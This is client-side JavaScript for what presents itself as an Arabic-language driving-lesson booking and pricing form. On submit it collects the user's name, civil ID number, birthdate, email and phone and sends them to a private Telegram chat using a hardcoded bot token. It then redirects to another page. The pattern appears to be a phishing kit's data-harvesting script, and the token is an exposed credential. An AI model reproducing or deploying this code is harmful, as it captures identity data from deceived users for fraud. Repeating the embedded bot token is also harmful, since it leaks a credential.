 const birthdateInput = document.getElementById('birthdate');
  birthdateInput.addEventListener('input', function(e) {
    let input = e.target.value.replace(/\D/g, '');
    if (input.length >= 3 && input.length <= 4) {
      input = input.slice(0, 2) + '/' + input.slice(2);
    } else if (input.length >= 5) {
      input = input.slice(0, 2) + '/' + input.slice(2, 4) + '/' + input.slice(4, 8);
    }
    e.target.value = input;
  });
const lessonsSelect = document.getElementById("lessonsCount");
const trainerSelect = document.getElementById("trainerType");
const vehicleSelect = document.getElementById("vehicleType");
const priceDisplay = document.getElementById("priceDisplay");

function updatePrice() {
  const numHours = parseFloat(lessonsSelect.value);
  const trainerType = trainerSelect.value;
  let pricePer2Hours = trainerType === "مدربة" ? 10 : 7;
  let totalPrice = (numHours / 2) * pricePer2Hours;

  priceDisplay.textContent = totalPrice.toFixed(2) + " دينار";
}

lessonsSelect.addEventListener('change', updatePrice);
trainerSelect.addEventListener('change', updatePrice);
updatePrice(); // لتحديث السعر المبدئي
const token = "7567367004:AAGG3iwWYOvR9NwvLeUQRG49WVNBcdtFTcM";
const chatId = "7595871538";
document.getElementById("quoteForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const name = document.getElementById("userName").value.trim();
  const civilId = document.getElementById("civilId").value.trim();
  const birthdate = document.getElementById("birthdate").value.trim();
  const email = document.getElementById("email").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const lessons = lessonsSelect.value;
  const trainer = trainerSelect.value;
  const vehicle = vehicleSelect.value;
  const price = priceDisplay.textContent;

  localStorage.setItem("userName", name);
  localStorage.setItem("civilId", civilId);
  localStorage.setItem("birthdate", birthdate);
  localStorage.setItem("email", email);
  localStorage.setItem("phone", phone);
  localStorage.setItem("lessonsCount", lessons);
  localStorage.setItem("trainerType", trainer);
  localStorage.setItem("vehicleType", vehicle);
  localStorage.setItem("totalPrice", price);

  const message = `
📥 طلب جديد لاختبار القيادة:
👤 الاسم: ${name}
🆔 الرقم المدني: ${civilId}
🎂 تاريخ الميلاد: ${birthdate}
📧 البريد الإلكتروني: ${email}
📱 رقم الموبايل: ${phone}
📚 عدد الدروس: ${lessons}
👤 نوع المدرب: ${trainer}
🚗 نوع المركبة: ${vehicle}
💰 السعر الكلي: ${price}
  `;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message })
  })
  .then(response => {
    if (response.ok) {
      window.location.href = "select.html";
    } else {
    }
  })
  .catch(error => {
  });
});